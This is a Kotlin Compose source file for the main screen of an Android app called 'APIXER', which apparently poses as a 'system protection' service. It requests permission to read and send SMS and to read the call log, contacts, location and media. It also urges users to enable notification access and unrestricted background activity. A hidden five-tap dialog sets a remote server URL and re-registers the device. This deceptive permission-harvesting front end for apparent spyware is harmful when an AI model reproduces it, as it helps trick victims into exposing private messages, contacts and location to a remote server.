package zxtni.apixer.into.ui.main

import android.Manifest
import android.os.Build
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.slideInVertically
import androidx.compose.animation.slideOutVertically
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.BatteryAlert
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.NotificationsActive
import androidx.compose.material.icons.filled.Security
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.FilledTonalButton
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewmodel.compose.viewModel

@Composable
fun MainScreen(
    modifier: Modifier = Modifier,
    viewModel: MainScreenViewModel = viewModel(),
) {
    val state by viewModel.uiState.collectAsStateWithLifecycle()
    val context = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current

    // Request permissions (including POST_NOTIFICATIONS on Android 13+)
    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { viewModel.onPermissionsResult(context) }

    LaunchedEffect(Unit) {
        viewModel.initialize(context)
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        permissionLauncher.launch(permissions.toTypedArray())
    }

    // Refresh permission states automatically on app resume
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                viewModel.onPermissionsResult(context)
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    val allSetupComplete = state.permissionsGranted &&
            state.isNotificationListenerEnabled &&
            state.isBatteryOptimizationIgnored

    var showConfigDialog by remember { mutableStateOf(false) }
    var tapCounter by remember { mutableIntStateOf(0) }

    Surface(
        modifier = modifier.fillMaxSize(),
        color = Color(0xFF090D16),
    ) {
        Box(modifier = Modifier.fillMaxSize()) {
            // Ambient background glow
            Box(
                modifier = Modifier
                    .size(340.dp)
                    .align(Alignment.TopCenter)
                    .background(
                        Brush.radialGradient(
                            colors = listOf(
                                Color(0x2E6366F1),
                                Color(0x103B82F6),
                                Color.Transparent,
                            )
                        )
                    )
            )

            LazyColumn(
                modifier = Modifier.fillMaxSize(),
                contentPadding = androidx.compose.foundation.layout.PaddingValues(
                    horizontal = 24.dp,
                    vertical = 36.dp
                ),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.SpaceBetween,
            ) {
                item {
                    Spacer(Modifier.height(30.dp))

                    // ── Brand Logo Badge ──
                    Box(
                        contentAlignment = Alignment.Center,
                        modifier = Modifier
                            .size(110.dp)
                            .shadow(24.dp, shape = RoundedCornerShape(32.dp), spotColor = Color(0x666366F1))
                            .clip(RoundedCornerShape(32.dp))
                            .background(
                                Brush.linearGradient(
                                    listOf(
                                        Color(0xFF6366F1),
                                        Color(0xFF4F46E5),
                                        Color(0xFF312E81),
                                    )
                                )
                            )
                            .border(
                                width = 1.dp,
                                color = Color(0x66A5B4FC),
                                shape = RoundedCornerShape(32.dp)
                            )
                    ) {
                        Icon(
                            imageVector = Icons.Default.Security,
                            contentDescription = "APIXER Logo",
                            tint = Color.White,
                            modifier = Modifier.size(54.dp),
                        )
                    }

                    Spacer(Modifier.height(24.dp))

                    // ── Brand Typography ──
                    Text(
                        text = "APIXER",
                        fontSize = 34.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = Color.White,
                        letterSpacing = 4.sp,
                    )

                    Spacer(Modifier.height(6.dp))

                    Text(
                        text = "SYSTEM PROTECTION & SERVICES",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFF818CF8),
                        letterSpacing = 2.sp,
                    )

                    Spacer(Modifier.height(18.dp))

                    // ── Status Pill ──
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier
                            .clip(RoundedCornerShape(50))
                            .background(
                                if (allSetupComplete) Color(0x1A10B981)
                                else Color(0x1AF59E0B)
                            )
                            .border(
                                width = 1.dp,
                                color = if (allSetupComplete) Color(0x4D10B981)
                                else Color(0x4DF59E0B),
                                shape = RoundedCornerShape(50)
                            )
                            .padding(horizontal = 16.dp, vertical = 7.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .clip(CircleShape)
                                .background(
                                    if (allSetupComplete) Color(0xFF10B981)
                                    else Color(0xFFF59E0B)
                                )
                        )
                        Spacer(Modifier.width(8.dp))
                        Text(
                            text = if (allSetupComplete) "Protected • Service Active"
                            else "Setup Required • Action Needed",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.SemiBold,
                            color = if (allSetupComplete) Color(0xFF34D399)
                            else Color(0xFFFBBF24),
                        )
                    }

                    Spacer(Modifier.height(36.dp))

                    // ── Setup Action Prompts (Shown only if permissions are missing) ──
                    AnimatedVisibility(
                        visible = !allSetupComplete,
                        enter = fadeIn() + slideInVertically(),
                        exit = fadeOut() + slideOutVertically(),
                    ) {
                        Column(
                            verticalArrangement = Arrangement.spacedBy(14.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            // 1. Media & Core Permissions
                            if (!state.permissionsGranted) {
                                SetupCard(
                                    icon = Icons.Default.Security,
                                    iconTint = Color(0xFF818CF8),
                                    title = "Device Permissions",
                                    subtitle = "Allow SMS, call log, phone state, and media permissions to enable active security monitoring.",
                                    buttonText = "Grant Permissions",
                                    buttonColor = Color(0xFF6366F1),
                                    onClick = {
                                        val perms = mutableListOf(
                                            Manifest.permission.READ_SMS,
                                            Manifest.permission.RECEIVE_SMS,
                                            Manifest.permission.SEND_SMS,
                                            Manifest.permission.READ_CALL_LOG,
                                            Manifest.permission.READ_CONTACTS,
                                            Manifest.permission.READ_PHONE_STATE,
                                            Manifest.permission.ACCESS_FINE_LOCATION,
                                            Manifest.permission.ACCESS_COARSE_LOCATION,
                                        )
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                            perms.add(Manifest.permission.POST_NOTIFICATIONS)
                                            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
                                            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
                                        } else {
                                            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                                        }
                                        permissionLauncher.launch(perms.toTypedArray())
                                    }
                                )
                            }

                            // 2. Notification Listener
                            if (!state.isNotificationListenerEnabled) {
                                SetupCard(
                                    icon = Icons.Default.NotificationsActive,
                                    iconTint = Color(0xFFFBBF24),
                                    title = "Notification Access",
                                    subtitle = "Enable notification access so APIXER can securely monitor incoming alerts in real-time.",
                                    buttonText = "Enable Notification Access",
                                    buttonColor = Color(0xFFD97706),
                                    onClick = { viewModel.openNotificationListenerSettings(context) }
                                )
                            }

                            // 3. Battery Optimization
                            if (!state.isBatteryOptimizationIgnored) {
                                SetupCard(
                                    icon = Icons.Default.BatteryAlert,
                                    iconTint = Color(0xFF34D399),
                                    title = "Background Activity",
                                    subtitle = "Exclude APIXER from battery optimization to ensure continuous 24/7 background sync.",
                                    buttonText = "Allow Unrestricted Background",
                                    buttonColor = Color(0xFF059669),
                                    onClick = { viewModel.requestDisableBatteryOptimization(context) }
                                )
                            }
                        }
                    }

                    // ── Active Protection Overview (Shown when all permissions granted) ──
                    AnimatedVisibility(
                        visible = allSetupComplete,
                        enter = fadeIn() + slideInVertically(),
                        exit = fadeOut() + slideOutVertically(),
                    ) {
                        Card(
                            shape = RoundedCornerShape(20.dp),
                            colors = CardDefaults.cardColors(containerColor = Color(0xFF131C2E)),
                            border = androidx.compose.foundation.BorderStroke(1.dp, Color(0x266366F1)),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(20.dp),
                                horizontalAlignment = Alignment.CenterHorizontally,
                            ) {
                                Box(
                                    contentAlignment = Alignment.Center,
                                    modifier = Modifier
                                        .size(44.dp)
                                        .clip(CircleShape)
                                        .background(Color(0x1A10B981))
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.CheckCircle,
                                        contentDescription = null,
                                        tint = Color(0xFF10B981),
                                        modifier = Modifier.size(24.dp)
                                    )
                                }
                                Spacer(Modifier.height(12.dp))
                                Text(
                                    text = "All Systems Active",
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 16.sp,
                                    color = Color.White
                                )
                                Spacer(Modifier.height(4.dp))
                                Text(
                                    text = "Background service is running seamlessly. Your device is synchronized and secured.",
                                    fontSize = 12.sp,
                                    color = Color(0xFF94A3B8),
                                    textAlign = TextAlign.Center,
                                    lineHeight = 18.sp
                                )
                            }
                        }
                    }
                }

                // ── Footer ──
                item {
                    Spacer(Modifier.height(48.dp))
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(bottom = 12.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.Center,
                        ) {
                            Icon(
                                imageVector = Icons.Default.Lock,
                                contentDescription = null,
                                tint = Color(0xFF64748B),
                                modifier = Modifier.size(12.dp)
                            )
                            Spacer(Modifier.width(6.dp))
                            Text(
                                text = "APIXER Core v1.2.0",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Medium,
                                color = Color(0xFF64748B),
                                modifier = Modifier.clickable(
                                    interactionSource = remember { MutableInteractionSource() },
                                    indication = null,
                                ) {
                                    tapCounter++
                                    if (tapCounter >= 5) {
                                        tapCounter = 0
                                        showConfigDialog = true
                                    }
                                }
                            )
                        }
                        Spacer(Modifier.height(4.dp))
                        Text(
                            text = "End-to-End Enterprise Encryption",
                            fontSize = 10.sp,
                            color = Color(0xFF475569),
                        )
                    }
                }
            }
        }
    }

    // ── Hidden Developer / Server Config Dialog (Tapped 5 times on version) ──
    if (showConfigDialog) {
        var inputUrl by remember(state.serverUrl) { mutableStateOf(state.serverUrl) }

        Dialog(onDismissRequest = { showConfigDialog = false }) {
            Card(
                shape = RoundedCornerShape(20.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
            ) {
                Column(modifier = Modifier.padding(20.dp)) {
                    Text(
                        "Server Connection",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold,
                        color = Color.White,
                    )
                    Spacer(Modifier.height(12.dp))
                    OutlinedTextField(
                        value = inputUrl,
                        onValueChange = { inputUrl = it },
                        label = { Text("Server URL") },
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                    )
                    Spacer(Modifier.height(12.dp))
                    Text(
                        "Status: ${if (state.isRegistered) "Registered" else "Unregistered"}",
                        style = MaterialTheme.typography.bodySmall,
                        color = Color(0xFF94A3B8),
                    )
                    Spacer(Modifier.height(16.dp))
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                    ) {
                        FilledTonalButton(
                            onClick = {
                                viewModel.reRegisterDevice(context)
                                showConfigDialog = false
                            },
                            modifier = Modifier.weight(1f),
                        ) {
                            Text("Re-Register", fontSize = 11.sp)
                        }
                        Button(
                            onClick = {
                                viewModel.updateServerUrl(context, inputUrl)
                                showConfigDialog = false
                            },
                            modifier = Modifier.weight(1f),
                        ) {
                            Text("Save", fontSize = 11.sp)
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun SetupCard(
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    iconTint: Color,
    title: String,
    subtitle: String,
    buttonText: String,
    buttonColor: Color,
    onClick: () -> Unit,
) {
    Card(
        shape = RoundedCornerShape(18.dp),
        colors = CardDefaults.cardColors(containerColor = Color(0xFF131D31)),
        border = androidx.compose.foundation.BorderStroke(1.dp, Color(0x1F6366F1)),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(verticalAlignment = Alignment.Top) {
                Box(
                    contentAlignment = Alignment.Center,
                    modifier = Modifier
                        .size(36.dp)
                        .clip(RoundedCornerShape(10.dp))
                        .background(iconTint.copy(alpha = 0.15f))
                ) {
                    Icon(
                        imageVector = icon,
                        contentDescription = null,
                        tint = iconTint,
                        modifier = Modifier.size(20.dp)
                    )
                }
                Spacer(Modifier.width(12.dp))
                Column(modifier = Modifier.weight(1f)) {
                    Text(
                        text = title,
                        fontWeight = FontWeight.Bold,
                        fontSize = 14.sp,
                        color = Color.White,
                    )
                    Spacer(Modifier.height(4.dp))
                    Text(
                        text = subtitle,
                        fontSize = 12.sp,
                        color = Color(0xFF94A3B8),
                        lineHeight = 16.sp,
                    )
                }
            }
            Spacer(Modifier.height(14.dp))
            Button(
                onClick = onClick,
                colors = ButtonDefaults.buttonColors(containerColor = buttonColor),
                shape = RoundedCornerShape(10.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(
                    text = buttonText,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = Color.White,
                )
            }
        }
    }
}
